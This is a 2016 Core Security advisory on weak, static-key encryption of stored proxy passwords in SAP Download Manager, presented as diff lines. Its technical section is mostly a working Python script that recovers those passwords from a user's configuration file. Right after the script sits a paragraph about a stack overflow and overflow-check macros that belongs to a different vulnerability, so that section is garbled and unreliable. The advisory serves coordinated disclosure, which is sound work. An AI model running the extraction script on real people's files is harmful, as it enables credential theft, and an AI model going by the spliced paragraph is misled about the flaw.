@@ -1,0 +1,387 @@
+
+Date: Wed, 9 Mar 2016 15:27:04 -0300
+From: CORE Advisories Team <advisories@...esecurity.com>
+To: <fulldisclosure@...lists.org>, <bugtraq@...urityfocus.com>
+Subject: [CORE-2016-0004] - SAP Download Manager Password Weak Encryption
+
+1. Advisory Information
+
+Title: SAP Download Manager Password Weak Encryption
+Advisory ID: CORE-2016-0004
+Advisory URL: http://www.coresecurity.com/advisories/sap-download-manager-password-weak-encryption
+Date published: 2016-03-08
+Date of last update: 2016-03-07
+Vendors contacted: SAP
+Release mode: Coordinated release
+
+2. Vulnerability Information
+
+Class: Storing Passwords in a Recoverable Format [CWE-257]
+Impact: Information leak
+Remotely Exploitable: No
+Locally Exploitable: Yes
+CVE Name: CVE-pending-assignment
+
+ 
+
+3. Vulnerability Description
+
+SAP Download Manager [1] is a Java application offered by SAP that allows downloading software packages and support notes. This program stores the user's settings in a configuration file. Sensitive values, such as the proxy username and password if set, are stored encrypted using a fixed static key.
+
+4. Vulnerable Packages
+
+SAP Download Manager version up to 2.1.142 (released in October 2015)
+Other products and versions might be affected, but they were not tested.
+
+5. Vendor Information, Solutions and Workarounds
+
+SAP published the following Security Note:
+
+2282338
+It can be accessed by SAP clients in their Support Portal [4].
+
+An updated version of SAP Download Manager can be found in their website [1].
+
+6. Credits
+
+This vulnerability was discovered and researched by Martin Gallo from Core Security Consulting Services. The publication of this advisory was coordinated by Joaquín Rodríguez Varela from Core Advisories Team.
+
+ 
+
+7. Technical Description / Proof of Concept Code
+
+SAP Download Manager is a Java application offered by SAP that allows downloading software packages and support notes. This program stores the user's settings in a configuration file. Configuration settings are stored in a Java HashMap object, which is serialized using Java's standard mechanism before being read from the configuration file. The program implemented encrypted storage of sensitive values since version 2.1.140a (see SAP Security Note 2074276 [2]). User's SAP Marketplace password is not stored in the configuration file since version 2.1.142 (see SAP Security Note 2235412 [3]). However, other sensitive values, such as the user's proxy password are stored encrypted.
+
+Encryption is performed using a different mechanism according to the platform where the program is run:
+
+On Windows and MacOS systems, the key is composed by the computer's BIOS serial number concatenated with a fixed key hard-coded in the program's code, up to 16 bytes.
+On other platforms, such as Linux, the key is only composed by a fixed key hard-coded in the program's code.
+Additionally, a transformation is performed over the value to encrypt. The code that handles the encryption/decryption it's inside the program's "StringWrapper" class.
+
+An attacker who manages to get access to a user's configuration file might be able to obtain the stored proxy password.
+
+The following python script can be used as a proof of concept for retrieving the stored values from a configuration file:
+
+ 
+#!/usr/bin/env python
+# ===========
+# pysap - Python library for crafting SAP's network protocols packets
+#
+# Copyright (C) 2012-2016 by Martin Gallo, Core Security
+#
+# The library was designed and developed by Martin Gallo from the Security
+# Consulting Services team of Core Security.
+#
+# This program is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License
+# as published by the Free Software Foundation; either version 2
+# of the License, or (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+# ==============
+
+# Standard imports
+from sys import platform
+from struct import pack, unpack
+from optparse import OptionParser
+from subprocess import check_output
+# pyCrypto import
+try:
+    from Crypto.Cipher import AES
+except ImportError:
+    AES = None
+
+
+# Java serialization decoding. Taken from http://stackoverflow.com/a/16470856
+def parse_java(f):
+    h = lambda s: ' '.join('%.2X' % ord(x) for x in s)  # format as hex
+    p = lambda s: sum(ord(x)*256**i for i, x in enumerate(reversed(s)))  # parse integer
+    magic = f.read(2)
+    assert magic == '\xAC\xED', h(magic)  # STREAM_MAGIC
+    assert p(f.read(2)) == 5  # STREAM_VERSION
+    handles = []
+
+    def parse_obj():
+        b = f.read(1)
+        if not b:
+            raise StopIteration  # not necessarily the best thing to throw here.
+        if b == '\x70':  # p TC_NULL
+            return None
+        elif b == '\x71':  # q TC_REFERENCE
+            handle = p(f.read(4)) - 0x7E0000  # baseWireHandle
+            o = handles[handle]
+            return o[1]
+        elif b == '\x74': # t TC_STRING
+            string = f.read(p(f.read(2))).decode('utf-8')
+            handles.append(('TC_STRING', string))
+            return string
+        elif b == '\x75': # u TC_ARRAY
+            data = []
+            cls = parse_obj()
+            size = p(f.read(4))
+            handles.append(('TC_ARRAY', data))
+            assert cls['_name'] in ('[B', '[I'), cls['_name']
+            for x in range(size):
+                data.append(f.read({'[B': 1, '[I': 4}[cls['_name']]))
+            return data
+        elif b == '\x7E': # ~ TC_ENUM
+            enum = {}
+            enum['_cls'] = parse_obj()
+            handles.append(('TC_ENUM', enum))
+            enum['_name'] = parse_obj()
+            return enum
+        elif b == '\x72': # r TC_CLASSDESC
+            cls = {'fields': []}
+            full_name = f.read(p(f.read(2)))
+            cls['_name'] = full_name.split('.')[-1] # i don't care about full path
+            f.read(8) # uid
+            cls['flags'] = f.read(1)
+            handles.append(('TC_CLASSDESC', cls))
+            assert cls['flags'] in ('\2', '\3', '\x0C', '\x12'), h(cls['flags'])
+            b = f.read(2)
+            for i in range(p(b)):
+                typ = f.read(1)
+                name = f.read(p(f.read(2)))
+                fcls = parse_obj() if typ in 'L[' else ''
+                cls['fields'].append((name, typ, fcls.split('/')[-1])) # don't care about full path
+            b = f.read(1)
+            assert b == '\x78', h(b)
+            cls['parent'] = parse_obj()
+            return cls
+        # TC_OBJECT
+        assert b == '\x73', (h(b), h(f.read(4)), repr(f.read(50)))
+        obj = {}
+        obj['_cls'] = parse_obj()
+        obj['_name'] = obj['_cls']['_name']
+        handle = len(handles)
+        parents = [obj['_cls']]
+        while parents[0]['parent']:
+            parents.insert(0, parents[0]['parent'])
+        handles.append(('TC_OBJECT', obj))
+        for cls in parents:
+            for name, typ, fcls in cls['fields'] if cls['flags'] in ('\2', '\3') else []:
+                if typ == 'I': # Integer
+                    obj[name] = p(f.read(4))
+                elif typ == 'S': # Short
+                    obj[name] = p(f.read(2))
+                elif typ == 'J': # Long
+                    obj[name] = p(f.read(8))
+                elif typ == 'Z': # Bool
+                    b = f.read(1)
+                    assert p(b) in (0, 1)
+                    obj[name] = bool(p(b))
+                elif typ == 'F': # Float
+                    obj[name] = h(f.read(4))
+                elif typ in 'BC': # Byte, Char
+                    obj[name] = f.read(1)
+                elif typ in 'L[': # Object, Array
+                    obj[name] = parse_obj()
+                else: # Unknown
+                    assert False, (name, typ, fcls)
+            if cls['flags'] in ('\3', '\x0C'): # SC_WRITE_METHOD, SC_BLOCKDATA
+                b = f.read(1)
+                if b == '\x77': # see the readObject / writeObject methods
+                    block = f.read(p(f.read(1)))
+                    if cls['_name'].endswith('HashMap') or cls['_name'].endswith('Hashtable'):
+                        # http://javasourcecode.org/html/open-source/jdk/jdk-6u23/java/util/HashMap.java.html
+                        # http://javasourcecode.org/html/open-source/jdk/jdk-6u23/java/util/Hashtable.java.html
+                        assert len(block) == 8, h(block)
+                        size = p(block[4:])
+                        obj['data'] = [] # python doesn't allow dicts as keys
+                        for i in range(size):
+                            k = parse_obj()
+                            v = parse_obj()
+                            obj['data'].append((k, v))
+                        try:
+                            obj['data'] = dict(obj['data'])
+                        except TypeError:
+                            pass # non hashable keys
+                    elif cls['_name'].endswith('HashSet'):
+                        # http://javasourcecode.org/html/open-source/jdk/jdk-6u23/java/util/HashSet.java.html
+                        assert len(block) == 12, h(block)
+                        size = p(block[-4:])
+                        obj['data'] = []
+                        for i in range(size):
+                            obj['data'].append(parse_obj())
+                    elif cls['_name'].endswith('ArrayList'):
+                        # http://javasourcecode.org/html/open-source/jdk/jdk-6u23/java/util/ArrayList.java.html
+                        assert len(block) == 4, h(block)
+                        obj['data'] = []
+                        for i in range(obj['size']):
+                            obj['data'].append(parse_obj())
+                    else:
+                        assert False, cls['_name']
+                    b = f.read(1)
+                assert b == '\x78', h(b) + ' ' + repr(f.read(30)) # TC_ENDBLOCKDATA
+        handles[handle] = ('py', obj)
+        return obj
+    objs = []
+    while 1:
+        try:
+            objs.append(parse_obj())
+        except StopIteration:
+            return objs
+
+
+def parse_config_file(filename, decrypt=False, serial_number=None):
+    print("[*] Opening DLManager config file: %s" % filename)
+
+    try:
+        with open(filename, 'r') as fil:
+            data = parse_java(fil)[0]["data"]
+    except:
+        print("[-] Error reading configuration file or invalid file")
+        return
+
+    print("[*] Read %d config values from config file" % len(data))
+    for item in data:
+        value = ""
+        if isinstance(data[item], basestring):
+            value = data[item]
+        elif "value" in data[item]:
+            value = data[item]["value"]
+        elif "_name" in data[item] and data[item]["_name"] == "StringWrapper":
+            value = data[item]["maBuffer"]
+            if value:
+                value = unwrap(value, decrypt, serial_number)
+        print("[*] Key=%s, Value=%s" % (item, value))
+
+
+def build_key(serial_number):
+    key = "hgjZ@...0!N%0Un*"
+    if serial_number:
+        key = serial_number + key
+    return key[:16]
+
+
+def decrypt(cipher_text, key):
+    aes = AES.new(key, AES.MODE_CBC, "\x00" * 16)       # Build the cipher using an empty IV
+    plain_text = aes.decrypt(cipher_text)               # Decrypt
+    plain_text = plain_text[0:-ord(plain_text[-1])]     # Unpad the plain text
+    return plain_text
+
+
+def unwrap(value, encrypted=False, serial_number=None):
+    pos = len(value)
+    unwrapped = []
+    for i in range(len(value)):
+        pos -= 1
+        (item, ) = unpack(">i", value[pos])             # Unpack the int value
+        item = item - 50 + pos                          # Apply the transformation
+        (item, ) = unpack(">b", pack(">i", item)[3:])   # Pack as int and drop first 3 bytes
+        unwrapped.append(item)
+
+    if encrypted:
+        cipher_text = b"".join([pack(">b", x) for x in unwrapped])
+        key = build_key(serial_number)
+        print("[*] Decrypt using key: %s" % key)
+        unwrapped = decrypt(cipher_text, key)
+        if len(unwrapped) == 0:
+            print("[-] Decryption failed. Maybe used a wrong serial number?")
+
+    else:
+        try:
+            unwrapped = b"".join(map(chr, unwrapped))
+        except ValueError:
+            print("[-] Invalid stored value. Maybe it's encrypted?")
+            unwrapped = None
+
+    return unwrapped
+
+
+def retrieve_serial_number():
+    if platform.startswith("linux"):
+        return ""
+    elif platform.startswith("win"):
+        output = check_output(["wmic", "bios", "get", "serialnumber"])
+        output = output.strip().split("\n")[1]
+        return output
+    elif platform.startswith("darwin"):
+        raise NotImplemented
+
+
+# Main function
+def main():
+    # Parse command line options
+    description = \
+    """This example script extract SAP's Download Manager stored passwords.
+    """
+
+    usage = "Usage: %prog [options] -f <config filename>"
+
+    parser = OptionParser(usage=usage, description=description)
+
+    parser.add_option("-f", "--filename", dest="filename", help="DLManager config filename", metavar="FILE")
+    parser.add_option("-e", "--encrypted", dest="encrypted", help="If passwords are stored encrypted (version >= 2.1.140a)",
+                      action="store_true")
+    parser.add_option("-s", "--serial-number", dest="serial_number", help="The machine's BIOS serial number")
+    parser.add_option("-r", "--retrieve-serial-number", dest="retrieve", help="If the script should try to retrieve the "
+                      "serial number from the machine and use it for decryption", action="store_true")
+    (options, args) = parser.parse_args()
+
+    if not options.filename:
+        parser.error("[-] DLManager config filename required !")
+
+    if options.retrieve:
+        print("[*] Trying to retrieve the machine's serial number")
+        options.serial_number = retrieve_serial_number()
+        options.encrypted = True
+        print("[*] Retrieved serial number: %s" % options.serial_number)
+
+    if options.encrypted and AES is None:
+        parser.error("[-] pyCrypto library required to decrypt not found !")
+
+    parse_config_file(options.filename, options.encrypted, options.serial_number)
+
+
+if __name__ == "__main__":
+    main()
+Note that the "code" variable contains an attacker controlled value, resulting in a stack overflow if the value is greater than 256 and the value for that code in the prefix table is also greater than 256. It's possible to fill in the stack with arbitrary values by controlling the values stored in the prefix and suffix tables.
+
+It's also worth mentioning that the above code includes a macro for performing some bounds checks on the stack pointer ("OVERFLOW_CHECK"). However, the check implemented by this macro is not sufficient for avoiding this vulnerability and could also lead to fault conditions when decompressing valid buffers. Moreover, vulnerable products and programs were built without this macro enabled ("CS_STACK_CHECK" macro not defined at the time of compilation).
+
+ 
+
+8. Report Timeline
+
+2016-02-05: Core Security sent an initial notification to SAP.
+2016-02-09: SAP confirmed reception of our email and requested we sent them a draft version of the advisory.
+2016-02-10: Core Security sent SAP a draft version of the advisory. We reminded them the release of the advisory would be the 7th of March unless they had any difficulties meeting that date.
+2016-02-11: SAP confirmed the reception of the advisory and created the security incident "90588 2016". They stated that March 7th was too short of a notice to work on the fix, release fix after quality tests and for customers to consume it.
+2016-02-15: SAP informed Core Security their development team confirmed the vulnerability. They requested us to comment on their timeline request.
+2016-02-15: Core Security informed SAP that we understood that they have their own guidelines for vulnerability disclosure and that we could coordinate for a later date for the release of the advisory but once the fix was made public we had to do the same with the advisory.
+2016-02-26: SAP informed Core Security they were currently working on a fix. They stated the target patch day would be 8 of March, 2016. They asked who should be noted as credit recipient.
+2016-02-26: Core Security informed SAP that was our goal to achieve a coordinated release, therefore, we would publish our advisory once the fix was available. Regarding crediting, we informed them Martin Gallo should be noted as credit recipient.
+2016-03-02: SAP informed Core Security they were on track with their correction for the 8 of March. They requested if we could update the note number in our advisory for their fix to the following "2282338". They asked if we could provide less detail in section 7 'Technical Description/Proof of Concept' in order to protect their customer's systems.
+2016-03-03: Core Security informed SAP that we had updated our advisory to include their security note reference. We informed them that it's our policy to publish our findings, usually in coordination with the affected vendor, with a complete technical description. We informed them as well that we believe user/customers are safer once they become aware of the potential security issues a device or software could have.
+2016-03-07: SAP informed Core Security they had the final confirmation to publish the security fix the 8 of March.
+2016-03-07: Core Security thanked SAP for the confirmation and requested them to update our internal ID of this vulnerability in their security note.
+2016-03-08: Advisory CORE-2016-0004 published.
+9. References
+
+[1] https://support.sap.com/software/download-manager.html. 
+[2] http://service.sap.com/sap/support/notes/2074276. 
+[3] http://service.sap.com/sap/support/notes/2235412. 
+[4] http://service.sap.com/sap/support/notes/2282338.
+
+10. About CoreLabs
+
+CoreLabs, the research center of Core Security, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.
+
+11. About Core Security
+
+Core Security enables organizations to get ahead of threats with security test and measurement solutions that continuously identify and demonstrate real-world exposures to their most critical assets. Our customers can gain real visibility into their security standing, real validation of their security controls, and real metrics to more effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted research and leading-edge threat expertise from the company's Security Consulting Services, CoreLabs and Engineering groups. Core Security can be reached at +1 (617) 399-6980 or on the Web at: http://www.coresecurity.com.
+
+12. Disclaimer
+
+The contents of this advisory are copyright (c) 2015 Core Security and (c) 2015 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+13. PGP/GPG Keys
+
+This advisory has been signed with the GPG key of Core Security advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
+
